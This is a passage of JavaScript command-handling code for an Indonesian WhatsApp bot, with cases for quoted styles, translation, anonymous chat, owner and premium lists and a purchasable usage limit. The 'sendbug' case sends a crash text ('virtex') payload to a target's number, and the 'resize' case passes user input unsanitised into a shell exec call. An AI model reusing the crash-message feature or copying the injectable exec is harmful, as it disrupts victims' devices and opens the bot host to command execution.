        await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fvideo})
        } else if ((args[0]) === 'fgc'){
        if(Qoted === "fgc") return setReply("Udah aktif")
        Qoted = "fgc"
        await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fgc})
        } else if ((args[0]) === 'fgif'){
        if(Qoted === "fgif") return setReply("Udah aktif")
        Qoted = "fgif"
        await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fgif})
        }else if ((args[0]) === 'fimage'){
        if(Qoted === "fimage") return setReply("Udah aktif")
        Qoted = "fimage"
        await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fimage})
        } else if ((args[0]) === 'dev'){
        if(Qoted === "dev") return setReply("Udah aktif")
        Qoted = "dev"
        await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: dev})
        } else if (!q) {
        xdev.sendButMessage(from, `SETTING QUOTED`, `Silahkan pilih salah satu`, [
        {buttonId: `${prefix}setquoted ftoko`, buttonText: {displayText: `ғᴛᴏᴋᴏ`},type: 1},
        {buttonId: `${prefix}setquoted fkontak`, buttonText: {displayText: `ғᴋᴏɴᴛᴀᴋ`},type: 1},
        {buttonId: `${prefix}setquoted ftext`, buttonText: { displayText: `ғᴛᴇxᴛ`},type: 1}],dev);
         } else {
 let teks =`Quoted yang kamu masukan salah\nSilakan pilih salah satu quoted berikut:\n1.ftoko\n2.fkontak\n3.ftext\n4.ftroli\n5.fsticker\n6.fvn\n7.floc\n8.fvideo\n9.fgc\n10.fgif\n11.fimage\n12.dev`
 setReply(teks)
 }
break



//Bug by Ius yg udah gua pecahin kodenya 😎
case  'sendbug':
try{
if(!isOwner) return onlyOwner()
let Pe = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
console.log(Pe)
if(!Pe ) return setReply("Masukan nomer target")
if(Pe == Ownerin) return setReply("SendBug Gagal")
await setReply("Sending...")
await xdev.sendKatalog(Pe, virtex8(prefix), virtex8(prefix), thumb, {quoted: setQuoted})
let a = await xdev.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
xdev.sendMessage(Pe, { text: "awowkwkwk" }, { quoted: a });
setReply(`Berhasil mengirim Bug ke Nomer ${Pe.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break


case 'setlang':
if(!isOwner) return onlyOwner()
try{
let translate = require('translate-google-api')
let tld = 'cn'
let result = await translate(`${text}`, {tld,to: q,})
language = q
setReply(`Berhasil mengubah bahasa ke ${q}`)
} catch(err){
setReply("Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages")
}
break


case 'tr': {
let translate = require('translate-google-api')
let defaultLang = 'en'
let tld = 'cn'
let err = `
Contoh:
${prefix + command} <lang> [text]
${prefix + command} id your messages

Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim()

let lang = args[0]
let text = args.slice(1).join(' ')
if ((args[0] || '').length !== 2) {
lang = defaultLang
text = args.join(' ')
}
if (!text && dev.quoted && dev.quoted.text) text = dev.quoted.text

    let result
    try {
        result = await translate(`${text}`, {
            tld,
            to: lang,
        })
    } catch (e) {
        result = await translate(`${text}`, {
            tld,
            to: defaultLang,
        })
        setReply(err)
    } finally {
        setReply(result[0])
    }

}
break

case 'fb':
            if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
            axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=AZZAM&url=${args[0]}`).then(({ data }) => {
                xdev.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4' })
            })
            break

case 'dashboard':{
let teks =`
*Dashboard*
        
Runtime : ${runtime(process.uptime())}
Total Hit : ${thisHit.toLocaleString()}`
let fall ="*Commands Today*  \n"
let totalFail =[]
let totalSuc = []
let total = 0
let tot = 0
await dash.map(async function(e, i){
fall += "*•*"+` ${e.cmd} : ${e.succes+e.failed} \n`   
await totalFail.push(e.failed)
await totalSuc.push(e.succes)
});
     
for(let i = 0; i < totalFail.length; i++){
total += totalFail[i]
} 

  for(let a = 0; a < totalSuc.length; a++){
      tot += totalSuc[a]
      } 
 
let akoh = `Total : ${dash.length} used`
let tod ="*Command Failed*\n"
let filteredArray = await dash.filter(item => item.failed > 0 )
await filteredArray.map(async function(e, i){
tod += "*•*"+` ${e.cmd} : ${e.failed} \n`   

});
let aw = `Total : ${filteredArray.length} failed`    
let tekz = teks+"\n\n"+fall+"\n"+akoh+"\n\n"+"*Command Status* \n"+" *•* Succes : "+tot+"\n"+" *•* Failed : "+total+"\n\n"+tod+"\n\n"
setReply(tekz)                                                        
}
break

case 'setfakegif':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await xdev.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./stik/fake gif.jpeg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah fake gif`)
} else {
setReply(`Kirim gambar dengan caption ${prefix+command}`);
}
}
break;

case 'obfus':{
var JavaScriptObfuscator = require('javascript-obfuscator');
 
if(q){
//await setReply("Loading...")
let obfuscationResult = JavaScriptObfuscator.obfuscate(q);
reply(obfuscationResult.getObfuscatedCode());
} else if(isQuotedTeks){
//await setReply("Loading...")
let obfuscationResult = JavaScriptObfuscator.obfuscate(dev.quoted.text);
reply(obfuscationResult.getObfuscatedCode());
} else setReply("Masukan code java script")
}
break

case 'packer':{
var UglifyJS = require("uglify-js");
if(q){
let result  = await UglifyJS.minify(q)
 reply(result.code)
} else if(isQuotedTeks){
  console.log(isQuotedTeks)
let result  = await UglifyJS.minify(dev.quoted.text)
 reply(result.code)
} else setReply("Masukan code java script atau reply file.js")
}
break

case 'deobfus':{

  function beautifyJavaScript (source) {
    const beautify = require('js-beautify').js_beautify
    return beautify(source, {indent_size: 2})
   }
   
  if(q){
    let teks = await beautifyJavaScript(q)
    setReply(teks)
  } else if(isQuotedTeks){
    let teks = await beautifyJavaScript(dev.quoted.text)
    setReply(teks)
  } else setReply("Masukan code java script")
  }
  break





case  'addowner':{

if (!isOwner) return onlyOwner()
if (!isGroup) return setReply(mess.only.group)
if(checkDataId("owner", Input,  DataId)) return setReply("User sudah menjadi owner")
if(!checkDataName("owner", Input, DataId)) { await createDataId("owner", DataId) }
addDataId(Input, "owner", DataId)
setReply(`Berhasil menambahkan ${Input} ke daftar owner`)
}
break

case  'delowner':
if (!isOwner) return onlyOwner() 
try {
if(!checkDataId("owner", Input, DataId)) return setReply(`User bukan owner`)
removeDataId ("owner", Input, DataId)
setReply(`Berhasil menghapus ${Input.split("@")[0]} ke daftar owner`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break





case  'addcmdowner':{
if (!isOwner) return onlyOwner()
if(!q) return setReply(mess.query)
if(checkDataId("commands", q,  DataId)) return setReply("User sudah menjadi owner")
if(!checkDataName("commands", q, DataId)) { await createDataId("commands", DataId) }
addDataId(q, "commands", DataId)
setReply(`Berhasil menambahkan ${q} ke daftar fitur owner`)
}
break
  
  case  'delcmdowner':
  if(!q) return setReply(mess.query)
  if (!isOwner) return onlyOwner() 
  try {
  if(!checkDataId("commands", q, DataId)) return setReply(`User bukan owner`)
  removeDataId ("commands", q, DataId)
  setReply(`Berhasil menghapus ${q} ke daftar fitur owner`)
  } catch (err){
  console.log(err)
  setReply(`${err}`)
  }
  break

  case 'listcmdowner':{
  let nana = await DataId.filter(item => item.name == "commands" )
  let teks ="List Commands For Owner\n"
  let nunu = nana[0].id
  for(let i of nunu){
    teks +=`. ${i}\n`   
    }    
  setReply(teks)
  }
  break
  
  
  
  
  case  'addcmdprem':{
if (!isOwner) return onlyOwner()
if(!q) return setReply(mess.query)
if(checkDataId("premium", q,  DataId)) return setReply("Command sudah ada di database")
if(!checkDataName("premium", q, DataId)) { await createDataId("premium", DataId) }
addDataId(q, "premium", DataId)
setReply(`Berhasil menambahkan ${q} ke daftar fitur premium`)
}
break
  
  case  'delcmdprem':
  if(!q) return setReply(mess.query)
  if (!isOwner) return onlyOwner() 
  try {
  if(!checkDataId("premium", q, DataId)) return setReply("Command tidak ada di database")
  removeDataId ("premium", q, DataId)
  setReply(`Berhasil menghapus ${q} ke daftar fitur premium`)
  } catch (err){
  console.log(err)
  setReply(`${err}`)
  }
  break
  
case 'listcmdprem':{
  if(!checkDataName("premium", q, DataId)) { await createDataId("premium", DataId) }
  let nana = await DataId.filter(item => item.name == "premium" )
  let teks ="List Command For Premium User\n\n"
  let nunu = nana[0].id
  for(let i of nunu){
    teks +=`• ${toFirstCase(i)}\n`   
    }    
   teks +=`\n• Total: ${nunu.length}\n` 
  setReply(teks)
  }
  break  



case  'addcmdlimit':{
if (!isOwner) return onlyOwner()
if(!q) return setReply(mess.query)
if(checkDataId("limit", q,  DataId)) return setReply("Command sudah ada di database")
if(!checkDataName("limit", q, DataId)) { await createDataId("limit", DataId) }
addDataId(q, "limit", DataId)
setReply(`Berhasil menambahkan ${q} ke daftar fitur limit`)
}
break
  
  case  'delcmdlimit':
  if(!q) return setReply(mess.query)
  if (!isOwner) return onlyOwner() 
  try {
  if(!checkDataId("limit", q, DataId)) return setReply("Command tidak ada di database")
  removeDataId ("limit", q, DataId)
  setReply(`Berhasil menghapus ${q} ke daftar fitur limit`)
  } catch (err){
  console.log(err)
  setReply(`${err}`)
  }
  break
  
case 'listcmdlimit':{
  let nana = await DataId.filter(item => item.name == "limit" )
  let teks ="List Commands For limit\n"
  let nunu = nana[0].id
  for(let i of nunu){
    teks +=`. ${i}\n`   
    }    
  setReply(teks)
  }
  break


case 'resize':
if (isQuotedImage || isImage) {
if(!q) return setReply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
setReply(mess.wait)
let panjang = q.split('x')[0] 
let lebar = q.split('x')[1] 
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar}  ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'image/jpeg', image: buffer453, caption: `Nih ${q}`}, { quoted: dev })
fs.unlinkSync(ran)
})
} else {
setReply("Reply Imagenya")
}
break


case 'infoall': case 'tagall':
if (!isGroup) return setReply(mess.only.group)
if(!q) {
var inpo = "No inpo"
} else var inpo = q
let members_id = []
let tes = '\n'
await groupMembers.map( i => {
tes += `┣ ⬣@${i.id.split('@')[0]}\n`
members_id.push(i.id) })
mentions(`
*From :* ${pushname}

 Info :  ${inpo}

Total Member : ${groupMembers.length} 

┏━⬣`+tes+`┗━⬣`, members_id, false)
break





    

case 'getallstik':{
for(let i of setiker){
let buffer = fs.readFileSync(`./temp/stick/${i}.webp`)
await xdev.sendMessage(from, {sticker: buffer})
await sleep(1000)
}
}
break




case 'start': {
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
if (roomA || roomB ) return setReply("Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu")

if (room) {
await xdev.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await xdev.sendMessage(room.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`}) 
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
             
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired: Date.now() + toMs("5m")
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`)
}

}
break

    
case 'stop':
case 'keluar': {
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
if(roomA && roomA.state == "CHATTING"){

await xdev.sendMessage(roomA.b, {text:"Partnermu telah meninggalkan room chat"})
await setTimeout(() => {
  setReply("Kamu telah keluar dari room chat")
  roomA.a = roomA.b
  roomA.b = ""
  roomA.state = "WAITING"
  roomA.expired = Date.now() + toMs("5m")
  fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
  
},1000)

} else if(roomA && roomA.state == "WAITING"){
setReply("Kamu telah keluar dari room chat")
//anonChat.splice(roomA, 1)
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

anonChat.splice(anonChat.indexOf(roomA, 1)) 
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

} else if(roomB && roomB.state == "CHATTING"){
await xdev.sendMessage(roomB.a,{text:`Partnermu telah meninggalkan room anonymous`})
setReply("Kamu telah keluar dari room anonymous dan meninggalkan partner mu")
  
roomB.b =""
roomB.state = "WAITING"
roomB.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))


} else setReply(`Kamu sedang tidak berada di room anonymous, tekan button untuk mencari partner`)
  

}
break


 case 'next':{
if (isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')

//Posisi di room A sedang waiting
if (roomA && roomA.state == "WAITING" ) {
setReply("Mencari Partner...")
anonChat.splice(roomA, 1)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

await setTimeout( async () => {
if ( Object.values(anonChat).find(room => room.state === 'WAITING' && room.b == "")) {
await xdev.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await xdev.sendMessage(room.b,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))           
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired : Date.now() + toMs("5m")
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room baru\nSilakan tunggu partner masuk ke dalam room`)
}
}, 2000) 

//Posisi Room A sedang cattingan
} else if(roomA && roomA.state == "CHATTING" ){
await xdev.sendMessage(roomA.b, {text: "Partnermu telah mengeluarkanmu dari room Anonymous"})
setReply("Kamu telah mengeluarkan partnermu dari room anonymous ")
await setTimeout(() => {
setReply("Menunggu partner masuk ke dalam room")
roomA.b = ""
roomA.state = "WAITING"
roomA.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
},1000)

//Posisi di Room B sedang chattingan
} else if(roomB){
await xdev.sendMessage(roomB.a, {text: "Partner telah meninggalkan room anonymous mu"})
setReply("Mohon tunggu sedang mencari room")
roomB.b =  ""
roomB.state = "WAITING"
roomB.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

await setTimeout( async () => {
if ( Object.values(anonChat).find(room => room.state === 'WAITING' && room.b == "")) {
await xdev.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await xdev.sendMessage(room.b,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))           
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired : Date.now() + toMs("5m")
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room baru\nSilakan tunggu partner masuk ke dalam room`)
}
}, 2000) 
} else setReply("Kamu sedang tidak berada di dalam room anonymous")



}
break

case 'sendkontak': {
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')

if (roomA && roomA.state == "CHATTING") {
let profile = await xdev.profilePictureUrl(roomA.a)
let status = await xdev.fetchStatus(roomA.a)
let msg = await xdev.sendImage(roomA.b, profile, `Nama : ${await xdev.getName(roomA.a)}\nBio : ${status.status}\nUser : @${roomA.a.split("@")[0]}`, m, { mentions: [roomA.a] })
xdev.sendContact(roomA.b, roomA.a.split("@")[0], await xdev.getName(roomA.a))
    
 } else if(roomB && roomB.state == "CHATTING"){
 let profile = await xdev.profilePictureUrl(roomB.b)
let status = await xdev.fetchStatus(roomB.b)
let msg = await xdev.sendImage(roomB.a, profile, `Nama : ${await xdev.getName(roomB.b)}\nBio : ${status.status}\nUser : @${roomB.b.split("@")[0]}`, m, { mentions: [roomB.b] })
xdev.sendContact(roomB.a, roomB.b.split("@")[0],await xdev.getName(roomB.b))

 } else if(roomA == "undefined" || roomB == "undefined" ){
setReply("Kamu sedang tidak berada di room anonymous")
  
} else setReply("Kamu belum dapat mengirim kontak karena kamu belum punya partner")

}
break


case 'startchat': {
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
if(!q) return setReply("Masukan nomer target yang mau di chat")
if (roomA || roomB ) return setReply("Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu")
let id = + new Date
const obj = {
id,
a: m.sender,
b: Input,
state: "CHATTING",
expired: "INFINITY"
}

anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room anonymous\nDan menjadikan dia sebagai partner mu\nSekarang kamu bisa mengirim pesan dan mengobrol dengan dia`)


}
break

case 'anonymous':{
if(isGroup) return setReply("Tidak bisa di gunakan di dalam group")
let teks =`
Anonymous Chat adalah
fitur yang memungkinkan kamu
berinteraksi dengan user lain
tanpa mengetahui identitas 
dan terintegrasi secara acak.

Klik start untuk memulai`

let mok = [{"buttonId": `${prefix}start`,"buttonText": {"displayText": `START`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}keluar`,"buttonText": {"displayText": `KELUAR`},"type": "RESPONSE"}]

xdev.sendButLoc(from, teks,copyright,fs.readFileSync('./stik/anonymous.jpg'), mok)

}
break



case 'invite':{
if(isGroup) return setReply("Fitur tidak bisa di gunakan di dalam group")
if(!roomA) return setReply("Kamu sedang tidak berada di room anonymous")
if(roomB && roomB.state == "CHATTING" || roomA && roomA.state == "CHATTING" ) return setReply("Kamu sudah berada di room anonymous dan sudah memulai sesi chat")
let getGroups = await xdev.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let ana = groups.map(v => v.id)
let mem = [];
for (let i of ana) {
let data = await xdev.groupMetadata(i)
let obj = { id : data.id, total : data.participants.length}
await mem.push(obj) 
}
let groupInvite = await mem.filter(member => member.total > 50 )

let yesnih = [{"buttonId": `${prefix}joinchat ${roomA.id}`,"buttonText": {"displayText": `ᴊᴏɪɴ ᴄʜᴀᴛ`},"type": "RESPONSE"}
                        ]

let teks = `
Seseorang telah mengundang kamu 
untuk bergabung ke room anonymous chat
tekan tombol join chat di bawah ini untuk 
bergabung di room anonymous dan memulai 
sesi chat dengan user lain`
await xdev.sendMessage(from, {text: `Mengirim undangan anonymous, waktu selesai ${groupInvite.length * 3 } detik`})

for (let i of groupInvite) {
await sleep(3000)
await xdev.sendButLoc(i.id, teks,copyright,fs.readFileSync('./stik/anonymous.jpg'), yesnih)
}
await xdev.sendMessage(from, {text: `Undangan telah terkirim ke ${groupInvite.length} group` })

}
break


case 'joinchat':{
if(!q) return setReply("Masukan id room anonymous")
if(roomA && roomA.state == "WAITING" ) return setReply("Kamu masih berada di room anonymous")
if(roomB && roomB.state == "CHATTING" || roomA && roomA.state == "CHATTING" ) return setReply("Kamu sudah berada di room anonymous dan sudah memulai sesi chat")
let joinRoom = Object.values(anonChat).find(room => room.id == q && room.state == "WAITING")
if (joinRoom) {
await xdev.sendMessage(joinRoom.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await xdev.sendMessage(joinRoom.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`}) 
setReply(`Berhasil join ke room, silakan cek di chat bot\nAtau bisa klik nomer di bawah ini untuk memulai sesi chat\n\nhttp://wa.me/${botNumber.split("@")[0]}`)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
             
} else if (room) {
await xdev.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await xdev.sendMessage(room.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`}) 
setReply(`Berhasil mendapatkan room, silakan cek di chat bot\nAtau bisa klik nomer di bawah ini untuk memulai sesi chat\n\nhttp://wa.me/${botNumber.split("@")[0]}`)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
             
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired: Date.now() + toMs("5m")
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
await xdev.sendMessage(sender,{text: `Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`})
setReply(`Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`)
}


}
break









case 'antivirtex':{
if (!isGroup) return setReply('Kusus group')
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
 if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntiVirtex) return setReply("Sudah aktif!!");
addDataId(from, command, DataId)
setReply("Sukses mengaktifkan antivirtex!");
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntiVirtex) return setReply("Udah off!!");
removeDataId (command, from, DataId)
setReply("Sukses mematikan antivirtex!");
} else if (!q) {
xdev.sendButMessage(from, `MODE Anti Virtex`, `Silahkan pilih salah satu`, 
[{buttonId: `${prefix}antivirtex on`, buttonText: { displayText: `on`,},type: 1,},
{buttonId: `${prefix}antivirtex off`, buttonText: { displayText: `off`,}, type: 1}, ]);
 }
 }
break;

case 'listowner':{
  if(!checkDataName("owner", q, DataId)) { await createDataId("owner", DataId) }
  let nana = await DataId.filter(item => item.name == "owner" )
  if(!nana) return setReply("Tidak ada")
  let teks ="List Owner\n"
  let nunu = nana[0].id
  for(let i of nunu){
    teks +=`. wa.me/${i.split("@")[0]} \n`   
    }    
  setReply(teks)
  }
  break


  case  'antihidetag':{
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isGroup) return setReply('hanya bisa di group')
if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntihidetag) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur anti hidetag telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntihidetag) return setReply('Fitur Anti link sudah off')
removeDataId (command, from, DataId)
let ih =`Fitur anti hidetag telah di matikan`
setReply(ih)
} else if (!q) {
xdev.sendButMessage(from, `MODE ANTI TAG`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}antihidetag on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antihidetag off`, buttonText: { displayText: Off },type: 1}]);
}
}
break

case  'intro': {
let teks = 'Member baru INTRO  :)\nNama lengkap:\nNama panggilan:\nHobi:\nUmur:\nGender:\nKelas:\nTinggi badan:\nBeratbadan :\nAgama:\nGolongan darah:\nStatus:\nNama pacar:\nJumlah mantan:\nNama mantan:\nNama bapak :\nNama ibu : \nNama kakak:\nKakak online:\nKakak kandung\tiri:\nJumlah kakak:\nNama adek:\nAdek online:\nAdek kandung\tiri:\nJumlah adek:\nNama kakek:\nKakek dari ayah :\nKakek dari ibu :\nNama nenek:\nNenek dari ayah :\nNenek dari ibu :\nNama bibi:\nBibi dari ayah :\nBibi dari ibu :\nNama paman:\nBibi dari ayah :\nBibi dari ibu :\nKTP:\nSIM:\nSTNK:\nBPKB:\nKK:\nAlamat rumah:\nRT:\nRW:\nKELURAHAN:\nKECAMATAN:\nKABUPATEN:\nKOTA:\nPROVINSI:\nPLANET:\nGALAXY:\nUNIVERSE:\nLANGIT:\nDARATAN:\nLAUTAN:\nKEPULAUAN:\nSAMUDRA:\nUKURAN SEPATU:\nUKURAN BAJU:\nUKURAN CELANA:\nLEBAR PINGGANG:\nPANJANG TANGAN:\nPANJANG KAKI:\nMAKANAN FAVORIT:\nMINUMAN FAVORIT:\nFILM FAVORIT:\nSINETRON FAVORIT:\nGAME FAVORIT:\nANIME FAVORIT:\nMANGA FAVORIT:\nMANHUA FAVORIT:\nMANHWA FAVORIT:\nCHANNEL YOUTUBE:\nINSTAGRAM:\nTWITTEER:\nFACEBOOK:\nMUSIC FAVORIT:\nSIFAT:\nSIKAP:\nZODIAK:\nTANGGAL LAHIR:\nMERK HP:\nMERK MOTOR:\nMERK MOBIL:\nTINGKAT RUMAH:\nALAMAT SEKOLAH:\nUkuran daleman:\nUkuran atasan :\nDiameter kepala :\nStatistik tubuh:\nDiameter perut :\nDiameter lengan :\nDiameter paha :\nDiameter lutut :\nDiameter betis:\nPanjang tangan :\nPanjang kaki :\nPanjang kepala :\nLebar hidung :\nCita cita :\nHobi :\nJenis hewanpeliharaan :\nNama hewan:\nDiameter rumah:\nWaifu:\nHusbu:\nLoli kesukaan :\nShota kesukaan :\nPunya brp teman :\nTeman online :\nTeman offline :\nTeman main game:\nTeman sekolah:\nTemen rumah:'
xdev.sendMessage(from, { text : teks }, { quoted: dev }) 
}
break    

  case 'owner':{
                xdev.sendKontak(from, global.nomerOwner, global.ownerName)
            }
            break

  case  'setimgdoc':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await xdev.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./stik/thumbnaildokumen.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image doc`)
} else {
setReply(`Kirim gambar dengan caption ${prefix+command}`);
}
}
break

 case  'setimgweb':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await xdev.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./stik/web.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image web`)
} else {
setReply(`Kirim gambar dengan caption ${prefix+command}`);
}
}
break

//By yudha perdana
           case 'wangy':
              if (!q) return setReply('query')
              let qq = q.toUpperCase()
              let awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              setReply(awikwok)
              break

case 'kontak':
case 'contact':
try{
var nice = await xdev.getName(Input)
if (mentionByReply && args[0]) {
await xdev.sendContact(from, mentionByReply.split("@")[0], args[0])
} else if(mentionByTag[0] && isGroup && args[1]) { 
await xdev.sendContact(from, mentionByTag[0].split("@")[0], args[1])
} else if(!mentionByTag[0] && args[0] && args[1]){
await xdev.sendContact(from, args[0], args[1])
} else if(mentionByReply && !args[0] || mentionByTag[0] && !args[1] || numberQuery && !args[1]){
await xdev.sendContact(from, Input.split("@")[0], nice)
}
} catch (err){
console.log(err)
setReply(`${err}`)
}
break

case  'limit':
case 'ceklimit': 
setReply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}\nLimit Game : ${cekGLimit(senderNumber, gcount, user)}/${gcount}\nLimit Menfess : ${getTes(senderNumber, user)}\nSaldo : Rp ${getBalance(senderNumber, user)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
break

case 'buylimit':{
if (!q) return setReply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = Rp1000`)
if (q.includes('-')) return setReply(`Jangan menggunakan -`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
let ane = Number(math(q) * 1000)
if (getBalance(senderNumber, user) < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(senderNumber, ane, user)
giveLimit(senderNumber, math(q), user)
setReply(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp ${getBalance(senderNumber, user).toLocaleString()}\nSisa Limit : ${getLimit(senderNumber, limitCount, user)}/${limitCount}`)
                       }
break

case 'claim':{   
